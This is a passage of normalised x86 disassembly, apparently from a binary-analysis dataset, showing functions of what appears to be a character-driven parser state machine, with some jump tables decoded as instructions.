mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x6
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0xa
mov eax 0x8
mov ecx ebx
call sub_10073fd0
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
add esp 0x4
pop edi
mov eax 0x1
pop esi
mov [ ecx ] 0x6
mov [ edx + 0x34 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax esi
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
mov edi esi
call sub_10073f90
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_100791c0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push 0x8
push ebx
mov [ esi + 0x8 ] 0x2
call sub_1006ee90
add esp 0x8
mov [ esi ] eax
lea ecx [ eax * 4 ]
add eax eax
mov [ esi + 0x8 ] eax
add eax eax
push edi
add eax eax
push eax
push ebx
mov [ ebp - 0x4 ] ecx
call sub_1006ee90
mov edx [ ebp - 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_1007f5d0
mov ecx [ esi ]
push ecx
push ebx
call sub_10021f70
add esp 0x1c
mov [ esi ] edi
pop edi
mov esp ebp
pop ebp
retn
sub_10079230
push ebp
mov ebp esp
push esi
push edi
mov edi eax
push edi
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
lea edi [ ebx + 0x94 ]
push edi
call sub_1006c7a0
push edi
call sub_1003fa70
mov ecx [ ebp + 0x8 ]
push edi
mov [ esi + 0x10 ] eax
mov [ esi ] ecx
call sub_100194e0
mov [ esi + 0x18 ] eax
mov ebx [ ebx ]
add esp 0x10
cmp ebx 0x43
ja r-xdata
pop ebx
movzx edx [ ebx + lookup_table_10079364 ]
jmp [ edx * 4 + jump_table_10079330 ]
pop ebx
pop edi
mov [ esi + 0x1c ] 0x0
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x1
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x2
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x3
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x4
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x5
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x6
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x7
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x8
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x9
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xb
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xc
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0xd
sub_10079371
add eax [ ebx ]
add eax [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x6
pop es
pop es
pop es
or [ eax ] cl
or [ ecx ] al
or [ ecx ] cl
or cl [ ebx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or al 0xcc
int3
sub_100793b0
push ebx
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1004dec0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add edi 0x20
push edi
push esi
call sub_1004af10
push edi
push esi
call sub_10006330
add esp 0x24
pop edi
pop ebx
retn
sub_100793f0
push esi
mov esi [ eax + 0x8 ]
push edi
lea ecx [ esi + 0x50 ]
push ecx
lea edi [ esi + 0x94 ]
push edi
call sub_1006c7a0
push edi
call sub_1003fa70
add esp 0xc
pop edi
mov [ esi + 0x48 ] eax
pop esi
retn
sub_10079420
push ebp
mov ebp esp
mov eax [ esi + 0x8 ]
push ebx
push edi
add eax 0x10
push eax
push esi
call sub_1004e640
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edi [ esi + 0x8 ]
lea edx [ edi + 0x94 ]
push edx
call sub_1004dec0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add edi 0x20
push edi
push esi
call sub_1004af10
push edi
push esi
call sub_10006330
add esp 0x2c
pop edi
pop ebx
pop ebp
retn
sub_10079470
push esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edx [ esi + 0x30 ]
push ebx
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x8 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0xc ] ecx
mov edx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] edx
call sub_1003fa70
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_1006c7a0
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
pop ebx
je r-xdata
lea ecx [ esi + 0x94 ]
push ecx
call sub_100428b0
add esp 0x4
pop esi
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_100794e0
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x80 ]
push eax
push esi
call sub_10021f70
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_1004e640
mov [ edi + 0x80 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1004dec0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004af10
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10006330
add ebx 0x20
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add esp 0x34
mov [ edi + 0x8c ] 0x1
pop edi
pop ebx
retn
sub_10079550
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x84 ]
push eax
push esi
call sub_10021f70
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_1004e640
mov [ edi + 0x84 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1004dec0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004af10
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10006330
add ebx 0x20
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add esp 0x34
mov [ edi + 0x90 ] 0x1
pop edi
pop ebx
retn
sub_100795c0
push ebp
mov ebp esp
push edi
mov edi eax
lea eax [ esi + 0x1 ]
cmp eax 0x21
ja r-xdata
mov eax 0x5
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079470
pop edi
pop ebp
retn
movzx eax [ eax + lookup_table_10079650 ]
jmp [ eax * 4 + jump_table_10079640 ]
mov eax 0x4
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079470
pop edi
pop ebp
retn
push r--data
call sub_10020200
mov eax 0x6
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ edi + 0x18 ] esi
call sub_10079470
pop edi
pop ebp
retn
mov eax 0x7
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079470
pop edi
pop ebp
retn
sub_10079654
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ edx ]
add eax [ edx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10079680
push ebx
push edi
mov edi eax
xor ebx ebx
mov [ edi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x7c ]
mov [ edi + 0x18 ] ecx
mov edx [ eax + 0x80 ]
mov [ edi + 0x1c ] edx
mov ecx [ eax + 0x84 ]
mov [ edi + 0x20 ] ecx
mov edx [ eax + 0x88 ]
mov [ edi + 0x24 ] edx
mov ecx [ eax + 0x8c ]
mov [ edi + 0x28 ] ecx
mov edx [ eax + 0x90 ]
mov eax esi
mov [ edi + 0x2c ] edx
call sub_10079470
mov eax [ esi + 0x8 ]
pop edi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
retn
sub_100796f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0x8 ]
add esi 0x3c
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov [ edi ] 0x2
mov edx [ esi + 0x10 ]
xor ebx ebx
mov [ edi + 0x18 ] edx
cmp [ esi + 0x24 ] ebx
jbe r-xdata
mov [ edi ] 0x1
mov eax [ esi + 0x10 ]
mov [ edi + 0x18 ] eax
mov ecx [ esi + 0x20 ]
mov [ edi + 0x1c ] ecx
mov edx [ esi + 0x24 ]
mov [ edi + 0x20 ] edx
mov eax [ esi + 0x28 ]
mov [ edi + 0x24 ] eax
mov ecx [ esi + 0x3c ]
mov [ edi + 0x28 ] ecx
mov eax [ esi + 0x10 ]
push eax
mov [ esi + 0x34 ] eax
call sub_10068a50
push eax
push r--data
call sub_10020200
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10021f70
mov edx [ esi + 0x10 ]
push edx
call sub_10068a50
push eax
push r--data
call sub_10020200
mov ebx [ ebp + 0x8 ]
add esp 0x14
mov eax [ esi + 0x20 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10055ac0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x24 ]
jb r-xdata
push esi
push ebx
call sub_1004af10
mov esi [ ebx + 0x8 ]
add esp 0x8
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi + 0x30 ]
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
mov [ edi + 0x8 ] edx
mov eax [ ebx + 0x8 ]
mov [ edi + 0xc ] eax
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] ecx
call sub_1003fa70
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_1006c7a0
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
je r-xdata
lea eax [ esi + 0x94 ]
push eax
call sub_100428b0
add esp 0x4
mov edx [ edi + 0x14 ]
push eax
push edx
push r--data
call sub_10020200
add esp 0xc
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_10079830
push esi
mov esi [ ebx + 0x8 ]
push edi
add esi 0x3c
xor edi edi
cmp [ esi + 0x24 ] edi
jbe r-xdata
mov edx [ esi + 0x20 ]
push edx
push ebx
call sub_10021f70
push esi
push ebx
call sub_1004af10
push r--data
call sub_10020200
add esp 0x14
pop edi
pop esi
retn
nop
mov eax [ esi + 0x20 ]
mov ecx [ eax + edi * 4 ]
push ecx
push ebx
call sub_10055ac0
inc edi
add esp 0x8
cmp edi [ esi + 0x24 ]
jb r-xdata
sub_10079880
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov esi eax
mov edi [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
push ecx
lea edx [ edi + 0x94 ]
push edx
push esi
call sub_100102f0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov edi ebx
mov eax esi
mov [ ebx ] 0x5
mov [ ebx + 0x18 ] 0x26
call sub_10079470
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
mov [ edi + 0x4 ] 0x1
push esi
mov esi [ ebp - 0xc ]
mov eax ebx
call sub_100795c0
mov ecx [ ebp - 0x8 ]
add esp 0x4
xor eax eax
cmp [ ebp - 0x4 ] eax
mov [ edi + 0xc ] ecx
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
sub_10079900
push ebx
push edi
mov edi eax
mov [ edi ] 0x3
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_1004e640
mov [ edi + 0x18 ] eax
mov ebx [ esi + 0x8 ]
lea eax [ ebx + 0x94 ]
push eax
call sub_1004dec0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004af10
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10006330
add ebx 0x20
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add esp 0x2c
mov eax esi
call sub_10079470
pop edi
mov eax 0x1
pop ebx
retn
sub_10079960
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebx + 0x8 ]
lea eax [ esi + 0x94 ]
push edi
push eax
call sub_10042e70
mov ecx [ esi + 0x10 ]
mov [ esi + 0x1c ] ecx
mov edi [ ebx + 0x8 ]
mov eax [ edi + 0x1c ]
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
mov [ edi + 0x1c ] ecx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x14 ]
add edx [ edi + 0x10 ]
cmp eax edx
jae r-xdata
mov edx [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
movsx esi [ eax ]
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] edx
call sub_100795c0
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax 0x1
add [ edi + 0x1c ] eax
mov [ edi + 0x4 ] ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100799d0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
push ebx
push edi
lea edi [ eax + 0x3c ]
add eax 0x94
push eax
call sub_100194e0
lea ecx [ eax - 0x41 ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp ecx 0x19
ja r-xdata
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10006330
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ ebx + 0x94 ]
push eax
call sub_1003fa70
mov edx [ ebp - 0x4 ]
push edi
push edx
push esi
mov [ ebx + 0x48 ] eax
call sub_1004c3a0
lea eax [ edi + 0x20 ]
push eax
push 0x4
push esi
call sub_1000e7d0
mov ecx [ ebp + 0x8 ]
xor eax eax
push r--data
mov [ edi + 0x2c ] eax
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] eax
call sub_10020200
add esp 0x30
pop edi
pop ebx
mov esp ebp
pop ebp
retn
add eax 0x20
mov [ ebp - 0x4 ] eax
sub_10079a70
push ebx
push edi
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push esi
call sub_1004e640
mov ebx eax
push ebx
call sub_10031030
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10021f70
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10006330
mov edi [ esi + 0x8 ]
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
push ebx
push esi
mov [ edi + 0x48 ] eax
call sub_10021f70
add esp 0x30
pop edi
pop ebx
retn
sub_10079ae0
push ebp
mov ebp esp
push esi
mov esi eax
push edi
push esi
call sub_100463f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov [ edi ] 0x18
mov ecx [ eax + 0x50 ]
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x54 ]
mov [ edi + 0x8 ] edx
mov ecx [ eax + 0x58 ]
mov [ edi + 0xc ] ecx
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + 0x1c ] eax
mov [ edi + 0x10 ] edx
mov [ edi + 0x20 ] ecx
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_1004e640
mov [ edi + 0x18 ] eax
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10021f70
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_10006330
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_1006c7a0
push edi
call sub_1003fa70
add esp 0x24
mov [ esi + 0x48 ] eax
sub_10079b70
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
xor edx edx
lea eax [ ebx + 0x5c ]
mov [ ebx + 0x68 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ecx
cmp ecx edx
jbe r-xdata
push 0x4c
push edi
call sub_1006ee90
mov esi eax
mov [ esi ] 0x0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_1004e640
mov [ esi + 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1003fa70
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ esi + 0xc ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
nop
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_1006c7a0
push r--data
push edi
call sub_1004c490
mov [ esi + 0x10 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x14 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1003fa70
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
dec eax
mov [ esi + 0xc ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebx + 0x40 ]
sub eax edx
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_1006c7a0
mov eax [ ebp - 0x10 ]
push eax
push esi
push edi
call sub_10046530
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
push edi
call sub_10021f70
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_10006330
mov edi [ edi + 0x8 ]
lea ecx [ edi + 0x50 ]
push ecx
lea esi [ edi + 0x94 ]
push esi
call sub_1006c7a0
push esi
call sub_1003fa70
add esp 0x30
mov [ edi + 0x48 ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax ecx
mov ecx [ ebx + 0x3c ]
cmp eax 0x4
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov esi [ eax + 0x4 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
push ecx
push edx
mov eax edi
call sub_10079ae0
add esp 0x8
pop edi
pop esi
mov [ ebx + 0x68 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
cmp eax 0x1
jbe r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
je r-xdata
sub_10079d70
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x68 ] 0x0
push edi
je r-xdata
mov ecx [ eax + 0x60 ]
mov edx [ eax + 0x5c ]
mov edi [ edx + ecx * 4 - 0x4 ]
mov eax [ edi + 0x10 ]
push ebx
push eax
push esi
call sub_10021f70
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_1004e640
mov [ edi + 0x10 ] eax
mov ebx [ esi + 0x8 ]
mov ecx [ ebx + 0x48 ]
lea eax [ ebx + 0x94 ]
push eax
mov [ edi + 0x14 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1003fa70
sub eax [ ebx + 0x48 ]
mov edx [ edi + 0x14 ]
add esp 0x14
mov [ edi + 0x18 ] eax
cmp [ edx + eax - 0x1 ] 0xd
jne r-xdata
mov [ eax + 0x68 ] 0x0
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10021f70
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10006330
mov esi [ esi + 0x8 ]
lea eax [ esi + 0x50 ]
push eax
lea edi [ esi + 0x94 ]
push edi
call sub_1006c7a0
push edi
call sub_1003fa70
add esp 0x1c
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x50 ]
mov [ edi + 0x34 ] ecx
mov edx [ ebx + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x38 ] edx
mov eax [ ebx + 0x58 ]
mov [ edi + 0x3c ] eax
add edi 0x40
push edi
push ecx
call sub_1006c7a0
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10021f70
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_10006330
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_1006c7a0
push edi
call sub_1003fa70
add esp 0x24
pop ebx
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
dec eax
mov [ edi + 0x18 ] eax
sub_10079e80
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
call sub_100795c0
add esp 0x8
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x26
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x7
call sub_100793b0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10079f50
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007a03c ]
jmp [ eax * 4 + jump_table_1007a028 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x3
pop edi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xa
call sub_100793b0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1004c3a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079470
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007a041
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007a0a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079470
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xd
call sub_100793b0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1004c3a0
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a160
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079470
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x10
call sub_100793b0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1004c3a0
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a220
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
